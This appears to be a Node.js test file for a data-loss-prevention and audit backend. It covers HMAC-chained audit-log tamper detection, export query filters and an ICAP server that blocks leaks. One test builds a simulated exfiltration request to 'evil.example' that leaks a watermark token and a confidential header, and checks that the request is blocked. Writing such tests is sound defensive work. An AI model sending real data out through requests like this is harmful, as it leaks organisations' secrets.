import assert from 'node:assert/strict';
import { createHmac, randomUUID } from 'node:crypto';
import * as net from 'node:net';
import { test } from 'node:test';
import { runAuditVerificationSweep } from '../dist/audit-verification-job.js';
import { queryExportDataset } from '../dist/export-query.helper.js';
import { formatExportPayload } from '../dist/exports/export-formatter.js';
import { IcapParser } from '../dist/icap/icap-parser.js';
import { IcapServer } from '../dist/icap/icap-server.js';

function signCanonicalLog(key, row) {
  const payload = {
    accessSessionId: row.access_session_id,
    action: row.action,
    actorUserId: row.actor_user_id ? row.actor_user_id.toString() : null,
    actorUsername: row.actor_username,
    chainAlgorithm: row.chain_algorithm,
    chainPartition: row.chain_partition,
    chainSequence: row.chain_sequence.toString(),
    correlationId: row.correlation_id,
    details: row.details,
    documentId: row.document_id,
    ipAddress: row.ip_address,
    objectId: row.object_id,
    objectType: row.object_type,
    occurredAt: row.occurred_at.toISOString(),
    outcome: row.outcome,
    previousHash: row.previous_hash,
    reasonCode: row.reason_code,
    userAgent: row.user_agent,
  };
  const canonical = JSON.stringify(
    Object.fromEntries(Object.entries(payload).sort(([a], [b]) => (a < b ? -1 : a > b ? 1 : 0))),
  );
  return createHmac('sha256', key).update(canonical, 'utf8').digest('hex');
}

function sendIcapRaw(port, payload) {
  return new Promise((resolve, reject) => {
    const socket = net.createConnection({ host: '127.0.0.1', port }, () => {
      socket.write(payload);
    });
    let responseBuffer = Buffer.alloc(0);
    socket.on('data', (chunk) => {
      responseBuffer = Buffer.concat([responseBuffer, chunk]);
    });
    socket.on('end', () => resolve(responseBuffer.toString('utf-8')));
    socket.on('error', reject);
  });
}

test('[BUG-013] Worker runAuditVerificationSweep fullScan detects DB tampering on row #2 behind valid anchor #4 without inflating incremental counts', async () => {
  const key = 'worker-bug013-hmac-key-at-least-32-chars!!';
  const rows = [];
  let prev = null;
  for (let i = 1; i <= 4; i++) {
    const row = {
      id: BigInt(i),
      chain_partition: 'AUTH',
      chain_sequence: BigInt(i),
      hmac_key_version: 1,
      chain_algorithm: 'HMAC-SHA-256',
      action: `LOGIN_${i}`,
      actor_user_id: 10n,
      actor_username: 'alice',
      correlation_id: randomUUID(),
      details: { step: i },
      document_id: null,
      access_session_id: null,
      ip_address: '127.0.0.1',
      object_type: 'AUTHENTICATION',
      object_id: '10',
      occurred_at: new Date(`2026-11-26T00:0${i}:00.000Z`),
      outcome: 'SUCCESS',
      previous_hash: prev,
      reason_code: null,
      user_agent: null,
      entry_hash: '',
    };
    row.entry_hash = signCanonicalLog(key, row);
    prev = row.entry_hash;
    rows.push(row);
  }

  // Simulate DB-level attacker tampering row #2 action while preserving entry_hash
  const tamperedRows = rows.map((r) =>
    r.chain_sequence === 2n ? { ...r, action: 'TAMPERED_ACTION' } : r,
  );
  const anchor4Sig = createHmac('sha256', key).update(`AUTH:4:${rows[3].entry_hash}`).digest('hex');

  const createdAlerts = [];
  const mockDb = {
    auditLog: {
      count: async () => 4,
      findFirst: async ({ where }) =>
        tamperedRows.find((r) => r.chain_sequence === where.chain_sequence) ?? null,
      findMany: async (args) => {
        if (args?.distinct) return [{ chain_partition: 'AUTH' }];
        if (args?.where?.chain_sequence?.gt) {
          return tamperedRows.filter((r) => r.chain_sequence > args.where.chain_sequence.gt);
        }
        return tamperedRows;
      },
    },
    auditAnchor: {
      findMany: async (args) => {
        if (args?.distinct) return [{ chain_partition: 'AUTH' }];
        return [
          {
            chain_partition: 'AUTH',
            anchor_sequence: 4n,
            entry_hash: rows[3].entry_hash,
            signature: anchor4Sig,
            signer_key_id: 'v1',
            status: 'VALID',
          },
        ];
      },
    },
    securityAlert: {
      findFirst: async () => null,
      create: async ({ data }) => {
        createdAlerts.push(data);
        return data;
      },
    },
    alertAuditLink: { create: async ({ data }) => data },
    $transaction: async (fn) => fn(mockDb),
  };

  // Incremental mode counts ONLY row #4 (1 row), reports 3 skipped, does NOT inflate to 4
  const incremental = await runAuditVerificationSweep(key, {
    databaseClient: mockDb,
    fullScan: false,
  });
  assert.equal(incremental.fullScan, false);
  assert.equal(incremental.totalLogsChecked, 1);
  assert.equal(incremental.totalLogsSkippedByAnchor, 3);

  // Full scan from sequence = 1 MUST catch tampered row #2 and create alert
  const full = await runAuditVerificationSweep(key, { databaseClient: mockDb, fullScan: true });
  assert.equal(full.fullScan, true);
  assert.equal(full.totalLogsChecked, 4);
  assert.equal(full.totalLogsSkippedByAnchor, 0);
  assert.equal(full.totalViolations, 1);
  assert.equal(full.alertsCreated, 1);
  assert.equal(createdAlerts.length, 1);
});

test('[BUG-014] Worker queryExportDataset aligns 100% with API (departmentId, UUID correlationId equals, lowercase enums, limit=1000, IN_REVIEW, SYSTEM_REPORT snapshots)', async () => {
  const corrId = randomUUID();
  const docId = randomUUID();
  let auditQuery = null;
  let alertQuery = null;
  let incidentQuery = null;
  let healthQuery = null;

  const mockDb = {
    auditLog: {
      findMany: async (args) => {
        auditQuery = args;
        return [];
      },
    },
    securityAlert: {
      findMany: async (args) => {
        alertQuery = args;
        return [];
      },
    },
    incidentReport: {
      findMany: async (args) => {
        incidentQuery = args;
        return [];
      },
    },
    systemHealthSnapshot: {
      findMany: async (args) => {
        healthQuery = args;
        return [
          {
            id: 1n,
            service_name: 'api',
            status: 'HEALTHY',
            response_time_ms: 14,
            error_count: 0,
            captured_at: new Date('2026-11-26T00:00:00.000Z'),
          },
        ];
      },
    },
  };

  // 1. AUDIT_LOGS: departmentId applied + correlation_id exact UUID equals + limit clamped to 1000
  await queryExportDataset(mockDb, 'AUDIT_LOGS', {
    departmentId: '15',
    correlationId: corrId,
    outcome: 'denied',
    limit: 50_000,
  });
  assert.deepEqual(auditQuery.where.correlation_id, { equals: corrId });
  assert.equal(auditQuery.where.outcome, 'DENIED');
  assert.equal(auditQuery.take, 1000);
  assert.deepEqual(auditQuery.where.OR, [
    { users: { department_id: { in: [15n] } } },
    { documents: { department_id: { in: [15n] } } },
  ]);

  // 2. SECURITY_ALERTS: lowercase "open" / "high" normalized to Prisma Enum uppercase
  await queryExportDataset(mockDb, 'SECURITY_ALERTS', {
    status: 'open',
    severity: 'high',
    ruleCode: 'MASS_DOWNLOAD',
  });
  assert.equal(alertQuery.where.status, 'OPEN');
  assert.equal(alertQuery.where.severity, 'HIGH');
  assert.equal(alertQuery.where.alert_type, 'MASS_DOWNLOAD');

  // 3. INCIDENT_REPORTS: supports IN_REVIEW, incidentCode, documentId, ruleCode & alert department scope
  await queryExportDataset(mockDb, 'INCIDENT_REPORTS', {
    status: 'in_review',
    incidentCode: 'INC-2026-042',
    documentId: docId,
    ruleCode: 'OFF_HOURS_ACCESS',
    __allowedDepartmentIds: ['10', '20'],
    departmentId: '10',
  });
  assert.equal(incidentQuery.where.status, 'IN_REVIEW');
  assert.equal(incidentQuery.where.incident_code, 'INC-2026-042');
  assert.deepEqual(incidentQuery.where.security_alerts, {
    document_id: docId,
    alert_type: 'OFF_HOURS_ACCESS',
  });
  assert.equal(incidentQuery.where.OR.length, 2);

  // 4. SYSTEM_REPORT: queries system_health_snapshots matching API (not 3 ad-hoc metrics)
  const healthRows = await queryExportDataset(mockDb, 'SYSTEM_REPORT', {
    serviceName: 'api',
    status: 'healthy',
  });
  assert.equal(healthQuery.where.service_name, 'api');
  assert.equal(healthQuery.where.status, 'HEALTHY');
  assert.equal(healthRows.length, 1);
  assert.equal(healthRows[0].service_name, 'api');
  const jsonArtifact = formatExportPayload('SYSTEM_REPORT', 'JSON', healthRows);
  const parsed = JSON.parse(jsonArtifact.buffer.toString('utf8'));
  assert.equal(parsed.exportType, 'SYSTEM_REPORT');
  assert.equal(parsed.rowCount, 1);
  assert.equal(parsed.items[0].service_name, 'api');
});

test('[BUG-016] ICAP RESPMOD parses BOTH req-hdr and res-hdr per RFC 3507 §4.9 and blocks leaks in request URL query & request headers', async () => {
  const wmToken = `WM-${'a1b2c3d4'.repeat(6)}`;
  const reqHdr =
    `GET /exfil?leak=${wmToken} HTTP/1.1\r\n` +
    `Host: evil.example\r\n` +
    `X-Custom-Header: TUYỆT MẬT nội bộ\r\n` +
    `Content-Encoding: gzip\r\n\r\n`;
  const resHdr =
    `HTTP/1.1 200 OK\r\n` +
    `Content-Type: text/plain\r\n` +
    `X-Custom-Header: harmless-response-value\r\n\r\n`;
  const resBody = 'Benign HTTP response payload.';
  const resBodyHex = Buffer.byteLength(resBody, 'utf8').toString(16);

  const reqHdrLen = Buffer.byteLength(reqHdr, 'utf8');
  const resHdrLen = Buffer.byteLength(resHdr, 'utf8');
  const rawRespmod =
    `RESPMOD icap://127.0.0.1/sda-dlp ICAP/1.0\r\n` +
    `Host: 127.0.0.1\r\n` +
    `Encapsulated: req-hdr=0, res-hdr=${reqHdrLen}, res-body=${reqHdrLen + resHdrLen}\r\n\r\n` +
    reqHdr +
    resHdr +
    `${resBodyHex}\r\n${resBody}\r\n0\r\n\r\n`;

  // 1. Parser must preserve httpMethod, httpUri from req-hdr, httpStatusCode from res-hdr, and BOTH headers
  const parsed = IcapParser.parseRequest(Buffer.from(rawRespmod, 'utf8'));
  assert.ok(parsed);
  assert.equal(parsed.httpMethod, 'GET');
  assert.equal(parsed.httpUri, `/exfil?leak=${wmToken}`);
  assert.equal(parsed.httpStatusCode, 200);
  assert.equal(parsed.httpStatusMessage, 'OK');
  assert.ok(parsed.httpHeaders?.['x-custom-header']?.includes('TUYỆT MẬT'));
  assert.ok(parsed.httpHeaders?.['x-custom-header']?.includes('harmless-response-value'));

  // 2. Live ICAP server must BLOCK leak in req-hdr query string & request header on standard RESPMOD
  const server = new IcapServer({ enabled: true, port: 0, host: '127.0.0.1', action: 'BLOCK' });
  const violations = [];
  server.onViolation((res) => violations.push(res));
  const { port } = await server.start();

  try {
    const blockedReply = await sendIcapRaw(port, rawRespmod);
    assert.ok(
      blockedReply.includes('HTTP/1.1 403 Forbidden'),
      `Expected 403 BLOCK for RESPMOD req-hdr leak, got: ${blockedReply}`,
    );
    assert.ok(blockedReply.includes('X-DLP-Status: BLOCKED'));
    assert.equal(violations.length, 1);

    // 3. Clean RESPMOD where req-hdr has Content-Encoding: gzip (POST request) and res-body is plain text must PASS (204)
    const cleanReqHdr =
      `POST /api/public/ping HTTP/1.1\r\n` +
      `Host: safe.example\r\n` +
      `Content-Encoding: gzip\r\n\r\n`;
    const cleanResHdr = `HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n`;
    const cleanBody = 'pong ok';
    const cleanReqLen = Buffer.byteLength(cleanReqHdr, 'utf8');
    const cleanResLen = Buffer.byteLength(cleanResHdr, 'utf8');
    const cleanRespmod =
      `RESPMOD icap://127.0.0.1/sda-dlp ICAP/1.0\r\n` +
      `Host: 127.0.0.1\r\n` +
      `Encapsulated: req-hdr=0, res-hdr=${cleanReqLen}, res-body=${cleanReqLen + cleanResLen}\r\n\r\n` +
      cleanReqHdr +
      cleanResHdr +
      `${Buffer.byteLength(cleanBody, 'utf8').toString(16)}\r\n${cleanBody}\r\n0\r\n\r\n`;

    const cleanReply = await sendIcapRaw(port, cleanRespmod);
    assert.ok(
      cleanReply.includes('ICAP/1.0 204 No modifications'),
      `Clean RESPMOD with request Content-Encoding: gzip must pass with 204, got: ${cleanReply}`,
    );
  } finally {
    await server.stop();
  }
});
